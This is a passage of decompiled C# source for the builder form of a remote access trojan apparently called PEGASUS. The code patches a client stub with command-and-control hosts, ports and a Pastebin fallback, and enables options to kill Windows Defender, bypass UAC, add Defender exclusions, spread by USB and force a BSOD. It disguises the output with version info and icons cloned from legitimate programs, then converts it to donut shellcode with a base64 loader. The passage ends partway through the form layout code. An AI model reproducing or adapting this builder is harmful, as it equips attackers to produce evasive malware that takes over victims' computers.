			txtProductVersion.Enabled = false;
			txtFileVersion.Enabled = false;
		}
	}

	private void ChkIcon_CheckedChanged(object sender, EventArgs e)
	{
		if (chkIcon.Checked)
		{
			txtIcon.Enabled = true;
			btnIcon.Enabled = true;
		}
		else
		{
			txtIcon.Enabled = false;
			btnIcon.Enabled = false;
		}
	}

	private void BtnIcon_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				string imageLocation = GetIcon(openFileDialog.FileName);
				txtIcon.Text = imageLocation;
				picIcon.ImageLocation = imageLocation;
			}
			else
			{
				txtIcon.Text = openFileDialog.FileName;
				picIcon.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private string GetIcon(string path)
	{
		try
		{
			string text = Path.GetTempFileName() + ".ico";
			using (FileStream stream = new FileStream(text, FileMode.Create))
			{
				IconExtractor.Extract1stIconTo(path, stream);
			}
			return text;
		}
		catch
		{
		}
		return "";
	}

	private void WriteSettings(ModuleDefMD asmDef, string AsmName)
	{
		try
		{
			string randomString = Methods.GetRandomString(32);
			Aes256 aes = new Aes256(randomString);
			X509Certificate2 x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
			byte[] inArray;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
			{
				byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
				inArray = rSACryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
			}
			foreach (TypeDef type in asmDef.Types)
			{
				asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
				asmDef.Name = Path.GetFileName(AsmName);
				if (!(type.Name == "Settings"))
				{
					continue;
				}
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body == null)
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list = new List<string>();
								foreach (string item3 in listBoxPort.Items)
								{
									list.Add(item3);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list2 = new List<string>();
								foreach (string item4 in listBoxIP.Items)
								{
									list2.Add(item4);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
						{
							method.Body.Instructions[i].Operand = comboBoxFolder.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%File%")
						{
							method.Body.Instructions[i].Operand = textFilename.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("PEGASUS ", ""));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
						{
							method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
						{
							if (chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt(txtPaste_bin.Text);
							}
							else
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
						{
							method.Body.Instructions[i].Operand = numDelay.Value.ToString();
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
						}
						if (chkAntiK.Checked && method.Body.Instructions[i].Operand.ToString() == "%Prostaths%")
						{
							method.Body.Instructions[i].Operand = "true";
						}
						if (chkUSB.Checked && method.Body.Instructions[i].Operand.ToString() == "%USB%")
						{
							method.Body.Instructions[i].Operand = "true";
						}
						if (chkKillWD.Checked && method.Body.Instructions[i].Operand.ToString() == "%Aspida%")
						{
							method.Body.Instructions[i].Operand = "true";
						}
						if (chkUac.Checked && method.Body.Instructions[i].Operand.ToString() == "%AlphaOmega%")
						{
							method.Body.Instructions[i].Operand = "true";
						}
						if (chkExclude.Checked && method.Body.Instructions[i].Operand.ToString() == "%Exclude%")
						{
							method.Body.Instructions[i].Operand = "true";
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			throw new ArgumentException("WriteSettings: " + ex.Message);
		}
	}

	public string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
		}
		return stringBuilder.ToString();
	}

	private void BtnClone_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
			txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
			txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
			txtProduct.Text = versionInfo.ProductName ?? string.Empty;
			txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
			txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
			_ = versionInfo.FileMajorPart;
			txtFileVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			txtProductVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	[DllImport("user32.DLL")]
	private static extern void ReleaseCapture();

	[DllImport("user32.DLL")]
	private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

	private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		ReleaseCapture();
		SendMessage(base.Handle, 274, 61458, 0);
	}

	private void guna2PictureBox1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void FormBuilder_FormClosed(object sender, FormClosedEventArgs e)
	{
		File.Delete(Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro")));
	}

	private void btnShelocode_Click(object sender, EventArgs e)
	{
		if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
		{
			return;
		}
		guna2Transition1.ShowSync(guna2PictureBox2);
		string text = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
		if (File.Exists(text))
		{
			File.Delete(text);
			canibuild();
		}
		else
		{
			canibuild();
		}
		ModuleDefMD moduleDefMD = null;
		try
		{
			using (moduleDefMD = ModuleDefMD.Load(text))
			{
				string text2 = Path.Combine(Path.GetTempPath(), "tempClient.exe");
				if (File.Exists(text2))
				{
					File.Delete(text2);
				}
				File.Copy(Path.Combine(text), text2);
				btnShellcode.Enabled = false;
				btnBuild.Enabled = false;
				WriteSettings(moduleDefMD, text2);
				moduleDefMD.Write(text2);
				moduleDefMD.Dispose();
				if (btnAssembly.Checked)
				{
					WriteAssembly(text2);
				}
				if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
				{
					IconInjector.InjectIcon(text2, txtIcon.Text);
				}
				string text3 = "";
				using (SaveFileDialog saveFileDialog = new SaveFileDialog())
				{
					saveFileDialog.Filter = ".bin (*.bin)|*.bin";
					saveFileDialog.InitialDirectory = Application.StartupPath;
					saveFileDialog.OverwritePrompt = false;
					saveFileDialog.FileName = "Client";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						text3 = saveFileDialog.FileName;
					}
				}
				string text4 = Path.Combine(Path.GetTempPath(), "donut.exe");
				if (!File.Exists(text4))
				{
					File.WriteAllBytes(text4, Resources.donut);
				}
				Process process = new Process();
				process.StartInfo.FileName = text4;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.Arguments = "-f " + text2 + " -o " + text3;
				process.Start();
				process.WaitForExit();
				process.Close();
				if (File.Exists(text3))
				{
					File.WriteAllText(text3 + "loader.cs", Resources.ShellcodeLoader.Replace("%PEGASUSshell%", Convert.ToBase64String(File.ReadAllBytes(text3))));
					File.WriteAllText(text3 + ".b64", Convert.ToBase64String(File.ReadAllBytes(text3)));
				}
				File.Delete(text2);
				File.Delete(text4);
				MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				SaveSettings();
				guna2Transition1.HideSync(guna2PictureBox2);
				guna2Transition1.ShowSync(guna2PictureBox3);
				SaveSettings();
				File.Delete(text);
				Close();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			moduleDefMD?.Dispose();
			btnBuild.Enabled = true;
		}
	}

	private void chVRunPe_CheckedChanged(object sender, EventArgs e)
	{
		if (chVRunPe.Checked)
		{
			btnShellcode.Enabled = false;
			chkObfu.Enabled = false;
			chkObfu.Checked = false;
		}
		else
		{
			btnShellcode.Enabled = true;
			chkObfu.Enabled = true;
			chkObfu.Checked = true;
		}
	}

	private void toolStripMenuItem70_Click(object sender, EventArgs e)
	{
		if (listBoxIP.SelectedItems.Count == 1)
		{
			listBoxIP.Items.Remove(listBoxIP.SelectedItem);
		}
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void btnLocal_Click(object sender, EventArgs e)
	{
		textIP.Text = string.Empty;
		textIP.Text = GetLocalIPAddress();
	}

	public static string GetLocalIPAddress()
	{
		IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
			{
				return iPAddress.ToString();
			}
		}
		throw new Exception("No network adapters with an IPv4 address in the system!");
	}

	private void btnEx_Click(object sender, EventArgs e)
	{
		textIP.Text = string.Empty;
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		WebClient webClient = new WebClient();
		string @string = uTF8Encoding.GetString(webClient.DownloadData("https://myexternalip.com/raw"));
		textIP.Text = @string;
	}

	private void btnStatic_Click(object sender, EventArgs e)
	{
		using Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP);
		socket.Connect("8.8.8.8", 65530);
		string text = (socket.LocalEndPoint as IPEndPoint).Address.ToString();
		textIP.Text = string.Empty;
		textIP.Text = text.ToString();
	}

	private void guna2GradientButton1_Click(object sender, EventArgs e)
	{
		textPort.Text = "4449";
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new System.ComponentModel.Container();
		Guna.UI2.AnimatorNS.Animation animation = new Guna.UI2.AnimatorNS.Animation();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBuilder));
		Guna.UI2.AnimatorNS.Animation animation2 = new Guna.UI2.AnimatorNS.Animation();
		directoryEntry1 = new System.DirectoryServices.DirectoryEntry();
		toolTip1 = new System.Windows.Forms.ToolTip(components);
		label17 = new System.Windows.Forms.Label();
		label16 = new System.Windows.Forms.Label();
		label5 = new System.Windows.Forms.Label();
		label3 = new System.Windows.Forms.Label();
		label4 = new System.Windows.Forms.Label();
		picIcon = new System.Windows.Forms.PictureBox();
		label14 = new System.Windows.Forms.Label();
		label13 = new System.Windows.Forms.Label();
		label12 = new System.Windows.Forms.Label();
		label11 = new System.Windows.Forms.Label();
		label10 = new System.Windows.Forms.Label();
		label9 = new System.Windows.Forms.Label();
		label7 = new System.Windows.Forms.Label();
		label8 = new System.Windows.Forms.Label();
		listBoxIP = new System.Windows.Forms.ListBox();
		guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		toolStripMenuItem70 = new System.Windows.Forms.ToolStripMenuItem();
		listBoxPort = new System.Windows.Forms.ListBox();
		guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
		btnAddIP = new Guna.UI2.WinForms.Guna2GradientButton();
		btnClone = new Guna.UI2.WinForms.Guna2GradientButton();
		btnRemoveIP = new Guna.UI2.WinForms.Guna2GradientButton();
		btnAddPort = new Guna.UI2.WinForms.Guna2GradientButton();
		btnRemovePort = new Guna.UI2.WinForms.Guna2GradientButton();
		btnIcon = new Guna.UI2.WinForms.Guna2GradientButton();
		guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
		tabPage1 = new System.Windows.Forms.TabPage();
		guna2Separator6 = new Guna.UI2.WinForms.Guna2Separator();
		guna2GroupBox5 = new Guna.UI2.WinForms.Guna2GroupBox();
		txtIcon = new Guna.UI2.WinForms.Guna2TextBox();
		guna2GroupBox4 = new Guna.UI2.WinForms.Guna2GroupBox();
		txtFileVersion = new Guna.UI2.WinForms.Guna2TextBox();
		txtProductVersion = new Guna.UI2.WinForms.Guna2TextBox();
		txtOriginalFilename = new Guna.UI2.WinForms.Guna2TextBox();
		txtCompany = new Guna.UI2.WinForms.Guna2TextBox();
		txtCopyright = new Guna.UI2.WinForms.Guna2TextBox();
		txtTrademarks = new Guna.UI2.WinForms.Guna2TextBox();
		txtDescription = new Guna.UI2.WinForms.Guna2TextBox();
		txtProduct = new Guna.UI2.WinForms.Guna2TextBox();
		chkIcon = new Guna.UI2.WinForms.Guna2CheckBox();
		btnAssembly = new Guna.UI2.WinForms.Guna2CheckBox();
		tabPage2 = new System.Windows.Forms.TabPage();
		guna2Separator5 = new Guna.UI2.WinForms.Guna2Separator();
		guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
		txtPaste_bin = new Guna.UI2.WinForms.Guna2TextBox();
		txtMutex = new Guna.UI2.WinForms.Guna2TextBox();
		textFilename = new Guna.UI2.WinForms.Guna2TextBox();
		label19 = new System.Windows.Forms.Label();
		label18 = new System.Windows.Forms.Label();
		comboBoxFolder = new Guna.UI2.WinForms.Guna2ComboBox();
		numDelay = new Guna.UI2.WinForms.Guna2NumericUpDown();
		txtGroup = new System.Windows.Forms.TextBox();
		chkPaste_bin = new Guna.UI2.WinForms.Guna2CheckBox();
		checkBox1 = new Guna.UI2.WinForms.Guna2CheckBox();
		tabPage3 = new System.Windows.Forms.TabPage();
		guna2Separator4 = new Guna.UI2.WinForms.Guna2Separator();
		guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
		btnStatic = new Guna.UI2.WinForms.Guna2GradientButton();
		btnEx = new Guna.UI2.WinForms.Guna2GradientButton();
		btnLocal = new Guna.UI2.WinForms.Guna2GradientButton();
		guna2VSeparator1 = new Guna.UI2.WinForms.Guna2VSeparator();
		label21 = new System.Windows.Forms.Label();
		label20 = new System.Windows.Forms.Label();
		textPort = new Guna.UI2.WinForms.Guna2TextBox();
		textIP = new Guna.UI2.WinForms.Guna2TextBox();
		guna2Separator7 = new Guna.UI2.WinForms.Guna2Separator();
		tabPage4 = new System.Windows.Forms.TabPage();
		guna2Separator3 = new Guna.UI2.WinForms.Guna2Separator();
		guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
		chkUSB = new Guna.UI2.WinForms.Guna2CheckBox();
		chkKillWD = new Guna.UI2.WinForms.Guna2CheckBox();
		chkExclude = new Guna.UI2.WinForms.Guna2CheckBox();
		chkAntiK = new Guna.UI2.WinForms.Guna2CheckBox();
		chkUac = new Guna.UI2.WinForms.Guna2CheckBox();
		chkBsod = new Guna.UI2.WinForms.Guna2CheckBox();
		chkAnti = new Guna.UI2.WinForms.Guna2CheckBox();
		chkAntiProcess = new Guna.UI2.WinForms.Guna2CheckBox();
		tabPage5 = new System.Windows.Forms.TabPage();
		chkCert = new Guna.UI2.WinForms.Guna2CheckBox();
		chkVBS = new Guna.UI2.WinForms.Guna2CheckBox();
		chkPowershell = new Guna.UI2.WinForms.Guna2CheckBox();
		chVRunPe = new Guna.UI2.WinForms.Guna2CheckBox();
		chkObfu = new Guna.UI2.WinForms.Guna2CheckBox();
		guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
		richTextBox2 = new System.Windows.Forms.RichTextBox();
		btnShellcode = new Guna.UI2.WinForms.Guna2GradientButton();
		label6 = new System.Windows.Forms.Label();
		btnBuild = new Guna.UI2.WinForms.Guna2GradientButton();
		guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
		guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
		guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
		guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
		pictureBox1 = new System.Windows.Forms.PictureBox();
		label15 = new System.Windows.Forms.Label();
		guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
		guna2Transition2 = new Guna.UI2.WinForms.Guna2Transition();
		guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
		guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
		guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
		guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		((System.ComponentModel.ISupportInitialize)picIcon).BeginInit();
		guna2ContextMenuStrip2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
		guna2TabControl1.SuspendLayout();
		tabPage1.SuspendLayout();
		guna2GroupBox5.SuspendLayout();
		guna2GroupBox4.SuspendLayout();
		tabPage2.SuspendLayout();
		guna2GroupBox3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)numDelay).BeginInit();
		tabPage3.SuspendLayout();
		guna2GroupBox1.SuspendLayout();
		tabPage4.SuspendLayout();
		guna2GroupBox2.SuspendLayout();
		tabPage5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox2).BeginInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox3).BeginInit();
		((System.ComponentModel.ISupportInitialize)guna2PictureBox4).BeginInit();
		guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
		SuspendLayout();
		label17.AutoSize = true;
		label17.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label17, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label17, Guna.UI2.AnimatorNS.DecorationType.None);
		label17.Location = new System.Drawing.Point(11, 47);
		label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label17.Name = "label17";
		label17.Size = new System.Drawing.Size(44, 15);
		label17.TabIndex = 109;
		label17.Text = "Group:";
		label16.AutoSize = true;
		guna2Transition1.SetDecoration(label16, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label16, Guna.UI2.AnimatorNS.DecorationType.None);
		label16.Location = new System.Drawing.Point(136, 112);
		label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label16.Name = "label16";
		label16.Size = new System.Drawing.Size(56, 15);
		label16.TabIndex = 107;
		label16.Text = "Sleep (s)";
		label5.AutoSize = true;
		label5.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label5, Guna.UI2.AnimatorNS.DecorationType.None);
		label5.Location = new System.Drawing.Point(11, 78);
		label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label5.Name = "label5";
		label5.Size = new System.Drawing.Size(44, 15);
		label5.TabIndex = 103;
		label5.Text = "Mutex:";
		label3.AutoSize = true;
		label3.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label3, Guna.UI2.AnimatorNS.DecorationType.None);
		label3.Location = new System.Drawing.Point(11, 165);
		label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label3.Name = "label3";
		label3.Size = new System.Drawing.Size(57, 15);
		label3.TabIndex = 97;
		label3.Text = "File path:";
		label4.AutoSize = true;
		label4.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label4, Guna.UI2.AnimatorNS.DecorationType.None);
		label4.Location = new System.Drawing.Point(11, 138);
		label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label4.Name = "label4";
		label4.Size = new System.Drawing.Size(65, 15);
		label4.TabIndex = 98;
		label4.Text = "File name:";
		picIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		guna2Transition2.SetDecoration(picIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition1.SetDecoration(picIcon, Guna.UI2.AnimatorNS.DecorationType.None);
		picIcon.ErrorImage = null;
		picIcon.Image = (System.Drawing.Image)resources.GetObject("picIcon.Image");
		picIcon.InitialImage = null;
		picIcon.Location = new System.Drawing.Point(215, 52);
		picIcon.Margin = new System.Windows.Forms.Padding(2);
		picIcon.Name = "picIcon";
		picIcon.Size = new System.Drawing.Size(87, 86);
		picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		picIcon.TabIndex = 91;
		picIcon.TabStop = false;
		label14.AutoSize = true;
		label14.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label14, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label14, Guna.UI2.AnimatorNS.DecorationType.None);
		label14.Location = new System.Drawing.Point(15, 212);
		label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label14.Name = "label14";
		label14.Size = new System.Drawing.Size(96, 15);
		label14.TabIndex = 82;
		label14.Text = "Product Version:";
		label13.AutoSize = true;
		label13.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label13, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label13, Guna.UI2.AnimatorNS.DecorationType.None);
		label13.Location = new System.Drawing.Point(15, 238);
		label13.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label13.Name = "label13";
		label13.Size = new System.Drawing.Size(74, 15);
		label13.TabIndex = 81;
		label13.Text = "File Version:";
		label12.AutoSize = true;
		label12.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label12, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label12, Guna.UI2.AnimatorNS.DecorationType.None);
		label12.Location = new System.Drawing.Point(15, 186);
		label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label12.Name = "label12";
		label12.Size = new System.Drawing.Size(108, 15);
		label12.TabIndex = 80;
		label12.Text = "Original Filename:";
		label11.AutoSize = true;
		label11.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label11, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label11, Guna.UI2.AnimatorNS.DecorationType.None);
		label11.Location = new System.Drawing.Point(15, 160);
		label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label11.Name = "label11";
		label11.Size = new System.Drawing.Size(76, 15);
		label11.TabIndex = 79;
		label11.Text = "Trademarks:";
		label10.AutoSize = true;
		label10.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label10, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label10, Guna.UI2.AnimatorNS.DecorationType.None);
		label10.Location = new System.Drawing.Point(15, 134);
		label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label10.Name = "label10";
		label10.Size = new System.Drawing.Size(61, 15);
		label10.TabIndex = 78;
		label10.Text = "Copyright:";
		label9.AutoSize = true;
		label9.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label9, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label9, Guna.UI2.AnimatorNS.DecorationType.None);
		label9.Location = new System.Drawing.Point(15, 108);
		label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label9.Name = "label9";
		label9.Size = new System.Drawing.Size(62, 15);
		label9.TabIndex = 77;
		label9.Text = "Company:";
		label7.AutoSize = true;
		label7.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label7, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label7, Guna.UI2.AnimatorNS.DecorationType.None);
		label7.Location = new System.Drawing.Point(15, 82);
		label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label7.Name = "label7";
		label7.Size = new System.Drawing.Size(72, 15);
		label7.TabIndex = 75;
		label7.Text = "Description:";
		label8.AutoSize = true;
		label8.BackColor = System.Drawing.Color.Transparent;
		guna2Transition1.SetDecoration(label8, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(label8, Guna.UI2.AnimatorNS.DecorationType.None);
		label8.Location = new System.Drawing.Point(15, 56);
		label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		label8.Name = "label8";
		label8.Size = new System.Drawing.Size(52, 15);
		label8.TabIndex = 73;
		label8.Text = "Product:";
		listBoxIP.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		listBoxIP.BorderStyle = System.Windows.Forms.BorderStyle.None;
		listBoxIP.ContextMenuStrip = guna2ContextMenuStrip2;
		guna2Transition1.SetDecoration(listBoxIP, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(listBoxIP, Guna.UI2.AnimatorNS.DecorationType.None);
		listBoxIP.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
		listBoxIP.FormattingEnabled = true;
		listBoxIP.ItemHeight = 15;
		listBoxIP.Location = new System.Drawing.Point(89, 156);
		listBoxIP.Margin = new System.Windows.Forms.Padding(2);
		listBoxIP.Name = "listBoxIP";
		listBoxIP.Size = new System.Drawing.Size(290, 90);
		listBoxIP.TabIndex = 70;
		guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
		guna2Transition1.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2Transition2.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
		guna2ContextMenuStrip2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(29, 29);
		guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { toolStripMenuItem70 });
		guna2ContextMenuStrip2.Margin = new System.Windows.Forms.Padding(3);
		guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
		guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(191, 37, 33);
		guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
